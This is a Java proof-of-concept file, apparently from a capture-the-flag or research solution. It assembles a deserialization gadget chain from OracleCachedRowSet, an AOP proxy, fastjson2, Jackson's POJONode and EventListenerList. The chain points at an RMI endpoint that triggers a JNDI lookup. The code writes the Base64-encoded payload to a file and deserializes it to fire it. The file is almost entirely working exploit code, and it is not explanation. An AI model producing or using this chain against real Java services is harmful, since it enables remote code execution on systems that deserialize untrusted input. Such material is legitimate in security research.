package com.example.solution;

import com.alibaba.fastjson2.JSONArray;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import oracle.jdbc.rowset.OracleCachedRowSet;

import javax.swing.event.EventListenerList;
import java.io.FileOutputStream;
import java.util.Base64;

public class Poc {
    public static void main(String[] args) throws Exception {
//        Tools17.bypassModule(Poc.class);
        OracleCachedRowSet oracleCachedRowSet = new OracleCachedRowSet();
        oracleCachedRowSet.setDataSourceName("rmi://localhost:1097/remoteobj");
        Object o = GadgetUtils17.makeObjectAopProxy(oracleCachedRowSet);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(o);


        POJONode node = GadgetUtils17.JacksonToString2GetterBetter(oracleCachedRowSet);


//        POJONode nodes = GadgetUtils17.JacksonToString2GetterBetter(oracleCachedRowSet);

        EventListenerList list = GadgetUtils17.eventListenerList(jsonArray);

        byte[] ser = Tools17.ser(list);
        String s = Base64.getEncoder().encodeToString(ser);
        new FileOutputStream("D://1tmp//payload.txt").write(s.getBytes());
        Tools17.deser(ser);

    }
}
